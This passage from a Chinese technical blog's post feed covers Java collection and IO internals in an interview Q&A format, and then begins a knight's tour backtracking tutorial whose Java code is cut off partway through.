容量通常大于实际存储元素的数量，所以只需发送真正有实际值的数组元素。</p><p><strong>size</strong> 是当前实际大小，elementData 大小大于等于 size。</p><p>**modCount **记录了 ArrayList 结构性变化的次数，继承自 AbstractList。所有涉及结构变化的方法都会增加该值。expectedModCount 是迭代器初始化时记录的 modCount 值，每次访问新元素时都会检查 modCount 和 expectedModCount 是否相等，不相等就会抛出异常。这种机制叫做 fail-fast，所有集合类都有这种机制。</p><hr><h4 id="Q2：说一说-LinkedList"><a href="#Q2：说一说-LinkedList" class="headerlink" title="Q2：说一说 LinkedList"></a>Q2：说一说 LinkedList</h4><p><strong>LinkedList</strong> 本质是双向链表，与 ArrayList 相比插入和删除速度更快，但随机访问元素很慢。除继承 AbstractList 外还实现了 Deque 接口，这个接口具有队列和栈的性质。成员变量被 transient 修饰，原理和 ArrayList 类似。</p><p>LinkedList 包含三个重要的成员：size、first 和 last。size 是双向链表中节点的个数，first 和 last 分别指向首尾节点的引用。</p><p>LinkedList 的优点在于可以将零散的内存单元通过附加引用的方式关联起来，形成按链路顺序查找的线性结构，内存利用率较高。</p><hr><h4 id="Q3：Set-有什么特点，有哪些实现？"><a href="#Q3：Set-有什么特点，有哪些实现？" class="headerlink" title="Q3：Set 有什么特点，有哪些实现？"></a>Q3：Set 有什么特点，有哪些实现？</h4><p><strong>Set</strong> 不允许元素重复且无序，常用实现有 HashSet、LinkedHashSet 和 TreeSet。</p><p><strong>HashSet</strong> 通过 HashMap 实现，HashMap 的 Key 即 HashSet 存储的元素，所有 Key 都使用相同的 Value ，一个名为 PRESENT 的 Object 类型常量。使用 Key 保证元素唯一性，但不保证有序性。由于 HashSet 是 HashMap 实现的，因此线程不安全。</p><p>HashSet 判断元素是否相同时，对于包装类型直接按值比较。对于引用类型先比较 hashCode 是否相同，不同则代表不是同一个对象，相同则继续比较 equals，都相同才是同一个对象。</p><p><strong>LinkedHashSet</strong> 继承自 HashSet，通过 LinkedHashMap 实现，使用双向链表维护元素插入顺序。</p><p><strong>TreeSet</strong> 通过 TreeMap 实现的，添加元素到集合时按照比较规则将其插入合适的位置，保证插入后的集合仍然有序。</p><hr><h4 id="Q4：TreeMap-有什么特点？"><a href="#Q4：TreeMap-有什么特点？" class="headerlink" title="Q4：TreeMap 有什么特点？"></a>Q4：TreeMap 有什么特点？</h4><p>TreeMap 基于红黑树实现，增删改查的平均和最差时间复杂度均为 O(log<del>n</del>) ，最大特点是 Key 有序。Key 必须实现 Comparable 接口或提供的 Comparator 比较器，所以 Key 不允许为 null。</p><p>HashMap 依靠 <code>hashCode</code> 和 <code>equals</code> 去重，而 TreeMap 依靠 Comparable 或 Comparator。 TreeMap 排序时，如果比较器不为空就会优先使用比较器的 <code>compare</code> 方法，否则使用 Key 实现的 Comparable 的 <code>compareTo</code> 方法，两者都不满足会抛出异常。</p><p>TreeMap 通过 <code>put</code> 和 <code>deleteEntry</code> 实现增加和删除树节点。插入新节点的规则有三个：① 需要调整的新节点总是红色的。② 如果插入新节点的父节点是黑色的，不需要调整。③ 如果插入新节点的父节点是红色的，由于红黑树不能出现相邻红色，进入循环判断，通过重新着色或左右旋转来调整。TreeMap 的插入操作就是按照 Key 的对比往下遍历，大于节点值向右查找，小于向左查找，先按照二叉查找树的特性操作，后续会重新着色和旋转，保持红黑树的特性。</p><hr><h4 id="Q5：HashMap-有什么特点？"><a href="#Q5：HashMap-有什么特点？" class="headerlink" title="Q5：HashMap 有什么特点？"></a>Q5：HashMap 有什么特点？</h4><p>JDK8 之前底层实现是数组 + 链表，JDK8 改为数组 + 链表&#x2F;红黑树，节点类型从Entry 变更为 Node。主要成员变量包括存储数据的 table 数组、元素数量 size、加载因子 loadFactor。</p><p>table 数组记录 HashMap 的数据，每个下标对应一条链表，所有哈希冲突的数据都会被存放到同一条链表，Node&#x2F;Entry 节点包含四个成员变量：key、value、next 指针和 hash 值。</p><p>HashMap 中数据以键值对的形式存在，键对应的 hash 值用来计算数组下标，如果两个元素 key 的 hash 值一样，就会发生哈希冲突，被放到同一个链表上，为使查询效率尽可能高，键的 hash 值要尽可能分散。</p><p>HashMap 默认初始化容量为 16，扩容容量必须是 2 的幂次方、最大容量为 1&lt;&lt; 30 、默认加载因子为 0.75。</p><hr><h4 id="Q6：HashMap-相关方法的源码？"><a href="#Q6：HashMap-相关方法的源码？" class="headerlink" title="Q6：HashMap 相关方法的源码？"></a>Q6：HashMap 相关方法的源码？</h4><p><strong>JDK8 之前</strong></p><p><strong>hash：计算元素 key 的散列值</strong></p><p>① 处理 String 类型时，调用 <code>stringHash32</code> 方法获取 hash 值。</p><p>② 处理其他类型数据时，提供一个相对于 HashMap 实例唯一不变的随机值 hashSeed 作为计算初始量。</p><p>③ 执行异或和无符号右移使 hash 值更加离散，减小哈希冲突概率。</p><p><strong>indexFor：计算元素下标</strong></p><p>将 hash 值和数组长度-1 进行与操作，保证结果不会超过 table 数组范围。</p><p><strong>get：获取元素的 value 值</strong></p><p>① 如果 key 为 null，调用 <code>getForNullKey</code> 方法，如果 size 为 0 表示链表为空，返回 null。如果 size 不为 0 说明存在链表，遍历 table[0] 链表，如果找到了 key 为 null 的节点则返回其 value，否则返回 null。</p><p>② 如果 key 为 不为 null，调用 <code>getEntry</code> 方法，如果 size 为 0 表示链表为空，返回 null 值。如果 size 不为 0，首先计算 key 的 hash 值，然后遍历该链表的所有节点，如果节点的 key 和 hash 值都和要查找的元素相同则返回其 Entry 节点。</p><p>③ 如果找到了对应的 Entry 节点，调用 <code>getValue</code> 方法获取其 value 并返回，否则返回 null。</p><p><strong>put：添加元素</strong></p><p>① 如果 key 为 null，直接存入 table[0]。</p><p>② 如果 key 不为 null，计算 key 的 hash 值。</p><p>③ 调用 <code>indexFor</code> 计算元素存放的下标 i。</p><p>④ 遍历 table[i] 对应的链表，如果 key 已存在，就更新 value 然后返回旧 value。</p><p>⑤ 如果 key 不存在，将 modCount 值加 1，使用 <code>addEntry</code> 方法增加一个节点并返回 null。</p><p><strong>resize：扩容数组</strong></p><p>① 如果当前容量达到了最大容量，将阈值设置为 Integer 最大值，之后扩容不再触发。</p><p>② 否则计算新的容量，将阈值设为 <code>newCapacity x loadFactor</code> 和 <code>最大容量 + 1</code> 的较小值。</p><p>③ 创建一个容量为 newCapacity 的 Entry 数组，调用 <code>transfer</code> 方法将旧数组的元素转移到新数组。</p><p><strong>transfer：转移元素</strong></p><p>① 遍历旧数组的所有元素，调用 <code>rehash</code> 方法判断是否需要哈希重构，如果需要就重新计算元素 key 的 hash 值。</p><p>② 调用 <code>indexFor</code> 方法计算元素存放的下标 i，利用头插法将旧数组的元素转移到新数组。</p><p><strong>JDK8</strong></p><p><strong>hash：计算元素 key 的散列值</strong></p><p>如果 key 为 null 返回 0，否则就将 key 的 <code>hashCode</code> 方法返回值高低16位异或，让尽可能多的位参与运算，让结果的 0 和 1 分布更加均匀，降低哈希冲突概率。</p><p><strong>put：添加元素</strong></p><p>① 调用 <code>putVal</code> 方法添加元素。</p><p>② 如果 table 为空或长度为 0 就进行扩容，否则计算元素下标位置，不存在就调用 <code>newNode</code> 创建一个节点。</p><p>③ 如果存在且是链表，如果首节点和待插入元素的 hash 和 key 都一样，更新节点的 value。</p><p>④ 如果首节点是 TreeNode 类型，调用 <code>putTreeVal</code> 方法增加一个树节点，每一次都比较插入节点和当前节点的大小，待插入节点小就往左子树查找，否则往右子树查找，找到空位后执行两个方法：<code>balanceInsert</code> 方法，插入节点并调整平衡、<code>moveRootToFront</code> 方法，由于调整平衡后根节点可能变化，需要重置根节点。</p><p>⑤ 如果都不满足，遍历链表，根据 hash 和 key 判断是否重复，决定更新 value 还是新增节点。如果遍历到了链表末尾则添加节点，如果达到建树阈值 7，还需要调用 <code>treeifyBin</code> 把链表重构为红黑树。</p><p>⑥ 存放元素后将 modCount 加 1，如果 <code>++size &gt; threshold</code> ，调用 <code>resize</code> 扩容。</p><p><strong>get ：获取元素的 value 值</strong></p><p>① 调用 <code>getNode</code> 方法获取 Node 节点，如果不是 null 就返回其 value 值，否则返回 null。</p><p>② <code>getNode</code> 方法中如果数组不为空且存在元素，先比较第一个节点和要查找元素的 hash 和 key ，如果都相同则直接返回。</p><p>③ 如果第二个节点是 TreeNode 类型则调用 <code>getTreeNode</code> 方法进行查找，否则遍历链表根据 hash 和 key 查找，如果没有找到就返回 null。</p><p><strong>resize：扩容数组</strong></p><p>重新规划长度和阈值，如果长度发生了变化，部分数据节点也要重新排列。</p><p><strong>重新规划长度</strong></p><p>① 如果当前容量 <code>oldCap &gt; 0</code> 且达到最大容量，将阈值设为 Integer 最大值，return 终止扩容。</p><p>② 如果未达到最大容量，当 <code>oldCap &lt;&lt; 1</code> 不超过最大容量就扩大为 2 倍。</p><p>③ 如果都不满足且当前扩容阈值 <code>oldThr &gt; 0</code>，使用当前扩容阈值作为新容量。</p><p>④ 否则将新容量置为默认初始容量 16，新扩容阈值置为 12。</p><p><strong>重新排列数据节点</strong></p><p>① 如果节点为 null 不进行处理。</p><p>② 如果节点不为 null 且没有next节点，那么通过节点的 hash 值和 <code>新容量-1</code> 进行与运算计算下标存入新的 table 数组。</p><p>③ 如果节点为 TreeNode 类型，调用 <code>split</code> 方法处理，如果节点数 hc 达到6 会调用 <code>untreeify</code> 方法转回链表。</p><p>④ 如果是链表节点，需要将链表拆分为 hash 值超出旧容量的链表和未超出容量的链表。对于<code>hash &amp; oldCap == 0</code> 的部分不需要做处理，否则需要放到新的下标位置上，新下标 &#x3D; 旧下标 + 旧容量。</p><hr><h4 id="Q7：HashMap-为什么线程不安全？"><a href="#Q7：HashMap-为什么线程不安全？" class="headerlink" title="Q7：HashMap 为什么线程不安全？"></a>Q7：HashMap 为什么线程不安全？</h4><p>JDK7 存在死循环和数据丢失问题。</p><p><strong>数据丢失：</strong></p><ul><li><p><strong>并发赋值被覆盖：</strong> 在 <code>createEntry</code> 方法中，新添加的元素直接放在头部，使元素之后可以被更快访问，但如果两个线程同时执行到此处，会导致其中一个线程的赋值被覆盖。</p></li><li><p><strong>已遍历区间新增元素丢失：</strong> 当某个线程在 <code>transfer</code> 方法迁移时，其他线程新增的元素可能落在已遍历过的哈希槽上。遍历完成后，table 数组引用指向了 newTable，新增元素丢失。</p></li><li><p><strong>新表被覆盖：</strong> 如果 <code>resize</code> 完成，执行了 <code>table = newTable</code>，则后续元素就可以在新表上进行插入。但如果多线程同时 <code>resize</code> ，每个线程都会 new 一个数组，这是线程内的局部对象，线程之间不可见。迁移完成后<code>resize</code> 的线程会赋值给 table 线程共享变量，可能会覆盖其他线程的操作，在新表中插入的对象都会被丢弃。</p></li></ul><p><strong>死循环：</strong> 扩容时 <code>resize</code> 调用 <code>transfer</code> 使用头插法迁移元素，虽然 newTable 是局部变量，但原先 table 中的 Entry 链表是共享的，问题根源是 Entry 的 next 指针并发修改，某线程还没有将 table 设为 newTable 时用完了 CPU 时间片，导致数据丢失或死循环。</p><p>JDK8 在 <code>resize</code> 方法中完成扩容，并改用尾插法，不会产生死循环，但并发下仍可能丢失数据。可用 ConcurrentHashMap 或 <code>Collections.synchronizedMap</code> 包装成同步集合。</p><hr><h3 id="IO-流-6"><a href="#IO-流-6" class="headerlink" title="IO 流 6"></a>IO 流 6</h3><h4 id="Q1：同步-异步-阻塞-非阻塞-IO-的区别？"><a href="#Q1：同步-异步-阻塞-非阻塞-IO-的区别？" class="headerlink" title="Q1：同步&#x2F;异步&#x2F;阻塞&#x2F;非阻塞 IO 的区别？"></a>Q1：同步&#x2F;异步&#x2F;阻塞&#x2F;非阻塞 IO 的区别？</h4><p>同步和异步是通信机制，阻塞和非阻塞是调用状态。</p><p>同步 IO 是用户线程发起 IO 请求后需要等待或轮询内核 IO 操作完成后才能继续执行。异步 IO 是用户线程发起 IO 请求后可以继续执行，当内核 IO 操作完成后会通知用户线程，或调用用户线程注册的回调函数。</p><p>阻塞 IO 是 IO 操作需要彻底完成后才能返回用户空间 。非阻塞 IO 是 IO 操作调用后立即返回一个状态值，无需等 IO 操作彻底完成。</p><hr><h4 id="Q2：什么是-BIO？"><a href="#Q2：什么是-BIO？" class="headerlink" title="Q2：什么是 BIO？"></a>Q2：什么是 BIO？</h4><p><strong>BIO</strong> 是同步阻塞式 IO，JDK1.4 之前的 IO 模型。服务器实现模式为一个连接请求对应一个线程，服务器需要为每一个客户端请求创建一个线程，如果这个连接不做任何事会造成不必要的线程开销。可以通过线程池改善，这种 IO 称为伪异步 IO。适用连接数目少且服务器资源多的场景。</p><hr><h4 id="Q3：什么是-NIO？"><a href="#Q3：什么是-NIO？" class="headerlink" title="Q3：什么是 NIO？"></a>Q3：什么是 NIO？</h4><p><strong>NIO</strong> 是 JDK1.4 引入的同步非阻塞 IO。服务器实现模式为多个连接请求对应一个线程，客户端连接请求会注册到一个多路复用器 Selector ，Selector 轮询到连接有 IO 请求时才启动一个线程处理。适用连接数目多且连接时间短的场景。</p><p>同步是指线程还是要不断接收客户端连接并处理数据，非阻塞是指如果一个管道没有数据，不需要等待，可以轮询下一个管道。</p><p>核心组件：</p><ul><li><p><strong>Selector：</strong> 多路复用器，轮询检查多个 Channel 的状态，判断注册事件是否发生，即判断 Channel 是否处于可读或可写状态。使用前需要将 Channel 注册到 Selector，注册后会得到一个 SelectionKey，通过 SelectionKey 获取 Channel 和 Selector 相关信息。</p></li><li><p><strong>Channel：</strong> 双向通道，替换了 BIO 中的 Stream 流，不能直接访问数据，要通过 Buffer 来读写数据，也可以和其他 Channel 交互。</p></li><li><p><strong>Buffer：</strong> 缓冲区，本质是一块可读写数据的内存，用来简化数据读写。Buffer 三个重要属性：position 下次读写数据的位置，limit 本次读写的极限位置，capacity 最大容量。</p><ul><li><code>flip</code> 将写转为读，底层实现原理把 position 置 0，并把 limit 设为当前的 position 值。</li><li><code>clear</code> 将读转为写模式（用于读完全部数据的情况，把 position 置 0，limit 设为 capacity）。</li><li><code>compact</code> 将读转为写模式（用于存在未读数据的情况，让 position 指向未读数据的下一个）。</li><li>通道方向和 Buffer 方向相反，读数据相当于向 Buffer 写，写数据相当于从 Buffer 读。</li></ul><p>使用步骤：向 Buffer 写数据，调用 flip 方法转为读模式，从 Buffer 中读数据，调用 clear 或 compact 方法清空缓冲区。</p></li></ul><hr><h4 id="Q4：什么是-AIO？"><a href="#Q4：什么是-AIO？" class="headerlink" title="Q4：什么是 AIO？"></a>Q4：什么是 AIO？</h4><p>AIO 是 JDK7 引入的异步非阻塞 IO。服务器实现模式为一个有效请求对应一个线程，客户端的 IO 请求都是由操作系统先完成 IO 操作后再通知服务器应用来直接使用准备好的数据。适用连接数目多且连接时间长的场景。</p><p>异步是指服务端线程接收到客户端管道后就交给底层处理IO通信，自己可以做其他事情，非阻塞是指客户端有数据才会处理，处理好再通知服务器。</p><p>实现方式包括通过 Future 的 <code>get</code> 方法进行阻塞式调用以及实现 CompletionHandler 接口，重写请求成功的回调方法 <code>completed</code> 和请求失败回调方法 <code>failed</code>。</p><hr><h4 id="Q5：java-io-包下有哪些流？"><a href="#Q5：java-io-包下有哪些流？" class="headerlink" title="Q5：java.io 包下有哪些流？"></a>Q5：java.io 包下有哪些流？</h4><p>主要分为字符流和字节流，字符流一般用于文本文件，字节流一般用于图像或其他文件。</p><p>字符流包括了字符输入流 Reader 和字符输出流 Writer，字节流包括了字节输入流 InputStream 和字节输出流 OutputStream。字符流和字节流都有对应的缓冲流，字节流也可以包装为字符流，缓冲流带有一个 8KB 的缓冲数组，可以提高流的读写效率。除了缓冲流外还有过滤流 FilterReader、字符数组流 CharArrayReader、字节数组流 ByteArrayInputStream、文件流 FileInputStream 等。</p><hr><h4 id="Q6：序列化和反序列化是什么？"><a href="#Q6：序列化和反序列化是什么？" class="headerlink" title="Q6：序列化和反序列化是什么？"></a>Q6：序列化和反序列化是什么？</h4><p>Java 对象 JVM 退出时会全部销毁，如果需要将对象及状态持久化，就要通过序列化实现，将内存中的对象保存在二进制流中，需要时再将二进制流反序列化为对象。对象序列化保存的是对象的状态，因此属于类属性的静态变量不会被序列化。</p><p>常见的序列化有三种：</p><ul><li><p><strong>Java 原生序列化</strong></p><p>实现 <code>Serializabale</code> 标记接口，Java 序列化保留了对象类的元数据（如类、成员变量、继承类信息）以及对象数据，兼容性最好，但不支持跨语言，性能一般。序列化和反序列化必须保持序列化 ID 的一致，一般使用 <code>private static final long serialVersionUID</code> 定义序列化 ID，如果不设置编译器会根据类的内部实现自动生成该值。如果是兼容升级不应该修改序列化 ID，防止出错，如果是不兼容升级则需要修改。</p></li><li><p><strong>Hessian 序列化</strong></p><p>Hessian 序列化是一种支持动态类型、跨语言、基于对象传输的网络协议。Java 对象序列化的二进制流可以被其它语言反序列化。Hessian 协议的特性：① 自描述序列化类型，不依赖外部描述文件，用一个字节表示常用基础类型，极大缩短二进制流。② 语言无关，支持脚本语言。③ 协议简单，比 Java 原生序列化高效。Hessian 会把复杂对象所有属性存储在一个 Map 中序列化，当父类和子类存在同名成员变量时会先序列化子类再序列化父类，因此子类值会被父类覆盖。</p></li><li><p><strong>JSON 序列化</strong></p><p>JSON 序列化就是将数据对象转换为 JSON 字符串，在序列化过程中抛弃了类型信息，所以反序列化时只有提供类型信息才能准确进行。相比前两种方式可读性更好，方便调试。</p></li></ul><p>序列化通常会使用网络传输对象，而对象中往往有敏感数据，容易遭受攻击，Jackson 和 fastjson 等都出现过反序列化漏洞，因此不需要进行序列化的敏感属性传输时应加上 transient 关键字。transient 的作用就是把变量生命周期仅限于内存而不会写到磁盘里持久化，变量会被设为对应数据类型的零值。</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>马踏棋盘算法</title>
      <link href="/posts/d145/"/>
      <url>/posts/d145/</url>
      
        <content type="html"><![CDATA[<h1 id="马踏棋盘算法"><a href="#马踏棋盘算法" class="headerlink" title="马踏棋盘算法"></a>马踏棋盘算法</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>马踏棋盘算法也被称为骑士周游问题。</p><p>将马随机放在国际象棋的8×8棋盘Board[0～7] [0～7]的某个方格中，马按走棋规则(马走日字)进行移动。要求每个方格只进入一次，走遍棋盘上全部64个方格。</p><p>游戏演示: <a href="http://www.4399.com/flash/146267_2.htm">http://www.4399.com/flash/146267_2.htm</a> </p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215033.png"></p><h2 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h2><blockquote><ol><li>创建棋盘 chessBoard , 是一个二维数组</li><li>将当前位置标记为已经访问和第几步，然后根据当前位置，计算马儿还能走哪些位置，并放入到一个集合中(ArrayList), 最多有8个位置， 每走一步，就使用step+1</li><li>遍历ArrayList中存放的所有位置，看看哪个可以走通 , 如果走通，就继续，走不通，就回溯</li><li>判断马儿是否完成了任务，使用 step 和应该走的步数比较 ， 如果不相等，则表示没有完成任务，置0回溯</li></ol></blockquote><hr><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.horse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.Point;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HorseChessboard</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> COLUMN; <span class="comment">// 棋盘的列数</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> ROW; <span class="comment">// 棋盘的行数</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> visited[][];<span class="comment">// 标记棋盘的各个位置是否被访问过</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> finished; <span class="comment">// 标记棋盘的所有位置是否都被访问</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;骑士周游算法，开始运行~~&quot;</span>);</span><br><span class="line">COLUMN = <span class="number">8</span>;</span><br><span class="line">ROW = <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> <span class="number">1</span>; <span class="comment">// 马儿初始位置的行，从1开始编号</span></span><br><span class="line"><span class="type">int</span> <span class="variable">column</span> <span class="operator">=</span> <span class="number">1</span>; <span class="comment">// 马儿初始位置的列，从1开始编号</span></span><br><span class="line"><span class="comment">// 创建棋盘</span></span><br><span class="line"><span class="type">int</span>[][] chessboard = <span class="keyword">new</span> <span class="title class_">int</span>[ROW][COLUMN];</span><br><span class="line">visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[ROW][COLUMN];<span class="comment">// 初始值都是false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试一下耗时</span></span><br><span class="line"><span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">travelChessboard(chessboard, row - <span class="number">1</span>, column - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">System.out.println(<span class="string">&quot;共耗时: &quot;</span> + (end - start) + <span class="string">&quot; 毫秒&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出棋盘的最后情况</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] rows : chessboard) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> step : rows) &#123;</span><br><span class="line">System.out.print(step + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">travelChessboard</span><span class="params">(<span class="type">int</span>[][] chessboard, <span class="type">int</span> row, <span class="type">int</span> column, <span class="type">int</span> step)</span> &#123;</span><br><span class="line">chessboard[row][column] = step;<span class="comment">// 标记该位置是第几步</span></span><br><span class="line">visited[row][column] = <span class="literal">true</span>; <span class="comment">// 标记该位置已经访问</span></span><br><span class="line">ArrayList&lt;Point&gt; ps = next(<span class="keyword">new</span> <span class="title class_">Point</span>(row, column));</span><br><span class="line"><span class="keyword">while</span> (!ps.isEmpty()) &#123;</span><br><span class="line"><span class="type">Point</span> <span class="variable">p</span> <span class="operator">=</span> ps.remove(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (visited[p.x][p.y] == <span class="literal">false</span>) &#123;</span><br><span class="line">travelChessboard(chessboard, p.x, p.y, step + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 说明: step &lt;ROW * COLUMN 成立的情况有两种</span></span><br><span class="line"><span class="comment">// 1. 棋盘到目前位置，仍然没有走完，出现死棋</span></span><br><span class="line"><span class="comment">// 2. 棋盘处于一个回溯过程</span></span><br><span class="line"><span class="keyword">if</span> (step &lt; ROW * COLUMN &amp;&amp; finished == <span class="literal">false</span>) &#123;</span><br><span class="line">chessboard[row][column] = <span class="number">0</span>;</span><br><span class="line">visited[row][column] = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">finished = <span class="literal">true</span>;<span class="comment">// 防止走完后回溯被打乱</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 功能： 根据当前位置，计算马儿还能走哪些位置(Point)，并放入到一个集合中(ArrayList), 最多有8个位置</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;Point&gt; <span class="title function_">next</span><span class="params">(Point curPoint)</span> &#123;</span><br><span class="line">ArrayList&lt;Point&gt; ps = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Point&gt;();</span><br><span class="line"><span class="type">Point</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Point</span>();</span><br><span class="line"><span class="comment">// 表示马儿是否可以走5这个位置</span></span><br><span class="line"><span class="keyword">if</span> ((p1.x = curPoint.x - <span class="number">1</span>) &gt;= <span class="number">0</span> &amp;&amp; (p1.y = curPoint.y - <span class="number">2</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">ps.add(<span class="keyword">new</span> <span class="title class_">Point</span>(p1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断马儿是否可以走6这个位置</span></span><br><span class="line"><span class="keyword">if</span> ((p1.x = curPoint.x - <span class="number">2</span>) &gt;= <span class="number">0</span> &amp;&amp; (p1.y = curPoint.y - <span class="number">1</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">ps.add(<span class="keyword">new</span> <span class="title class_">Point</span>(p1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断马儿是否可以走7这个位置</span></span><br><span class="line"><span class="keyword">if</span> ((p1.x = curPoint.x - <span class="number">2</span>) &gt;= <span class="number">0</span> &amp;&amp; (p1.y = curPoint.y + <span class="number">1</span>) &lt; COLUMN) &#123;</span><br><span class="line">ps.add(<span class="keyword">new</span> <span class="title class_">Point</span>(p1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断马儿是否可以走0这个位置</span></span><br><span class="line"><span class="keyword">if</span> ((p1.x = curPoint.x - <span class="number">1</span>) &gt;= <span class="number">0</span> &amp;&amp; (p1.y = curPoint.y + <span class="number">2</span>) &lt; COLUMN) &#123;</span><br><span class="line">ps.add(<span class="keyword">new</span> <span class="title class_">Point</span>(p1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断马儿是否可以走1这个位置</span></span><br><span class="line"><span class="keyword">if</span> ((p1.x = curPoint.x + <span class="number">1</span>) &lt; ROW &amp;&amp; (p1.y = curPoint.y + <span class="number">2</span>) &lt; COLUMN) &#123;</span><br><span class="line">ps.add(<span class="keyword">new</span> <span class="title class_">Point</span>(p1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断马儿是否可以走2这个位置</span></span><br><span class="line"><span class="keyword">if</span> ((p1.x = curPoint.x + <span class="number">2</span>) &lt; ROW &amp;&amp; (p1.y = curPoint.y + <span class="number">1</span>) &lt; COLUMN) &#123;</span><br><span class="line">ps.add(<span class="keyword">new</span> <span class="title class_">Point</span>(p1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断马儿是否可以走3这个位置</span></span><br><span class="line"><span class="keyword">if</span> ((p1.x = curPoint.x + <span class="number">2</span>) &lt; ROW &amp;&amp; (p1.y = curPoint.y - <span class="number">1</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">ps.add(<span class="keyword">new</span> <span class="title class_">Point</span>(p1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断马儿是否可以走4这个位置</span></span><br><span class="line"><span class="keyword">if</span> ((p1.x = curPoint.x + <span class="number">1</span>) &lt; ROW &amp;&amp; (p1.y = curPoint.y - <span class="number">2</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span 